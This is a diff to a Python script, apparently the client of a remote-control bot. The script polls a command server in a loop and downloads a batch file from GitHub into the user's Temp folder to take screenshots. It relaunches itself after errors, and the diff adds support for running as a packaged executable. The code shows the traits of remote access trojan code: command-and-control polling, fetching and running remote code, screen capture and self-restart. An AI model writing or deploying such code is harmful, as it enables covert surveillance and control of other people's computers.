@@ -20,7 +20,7 @@ from tkinter import messagebox
 import base64
 import time
 import json
-
+import sys
 
 """
 
@@ -44,7 +44,7 @@ my_headers.update({
     })
 s = requests.Session()
 
-home_host = 'http://127.0.0.1:8000'
+home_host = 'http://127.0.0.1'
 
 """
 
@@ -227,11 +227,9 @@ Name of screenshot is a filtered MAC (without :) and current time.
 
 
 def screenshot(*args):
-    curr_user = os.getlogin()
-    sys_disk = os.getenv("SystemDrive")
-    #print(sys_disk)
+    user_home = os.path.expanduser('~')
     app_url = 'https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat'
-    app_dir = sys_disk + '\\Users\\' + curr_user + '\\AppData\\Local\\Temp\\'
+    app_dir = user_home + '\\AppData\\Local\\Temp\\'
     #print(app_dir)
     r = s.get(app_url)
     with open(app_dir + 'screenCapture.bat', 'w') as f:
@@ -281,9 +279,15 @@ Aditionally path to script (after error, script self-rerun).
 
 received_ids = []
 send_commands = []
-script_path = os.path.abspath(__file__)
 
 
+def rerun():
+    if getattr(sys, 'frozen', False):
+        file_path = sys.argv[0]
+        subprocess.Popen([file_path])
+    else:
+        file_path = os.path.abspath(__file__)
+        subprocess.Popen(['python', file_path])
 """
 
 PC try to connect to remote server - in range 0 to 4
@@ -305,7 +309,7 @@ while try_cc < 4:
         time.sleep(10)
     try_cc += 1
     if try_cc == 4:
-        subprocess.Popen(['python', script_path])
+        rerun()
         raise SystemExit
 
 
@@ -348,7 +352,7 @@ while True:
                 time.sleep(10)
             try_ord += 1
             if try_ord == 4:
-                subprocess.Popen(['python', script_path])
+                rerun()
                 raise SystemExit
         resp_data = say_ready.json()
         print(resp_data)
@@ -394,7 +398,7 @@ while True:
     except Exception as e:
         print(e)
         print('!!!! WYSTAPIL BLAD, URUCHAMIAM SKRYPT PONOWNIE !!!!')
-        subprocess.Popen(['python', script_path])
+        rerun()
         raise SystemExit
     print('++++ SLEEP NA 10 SEKUND ++++')
     time.sleep(10)
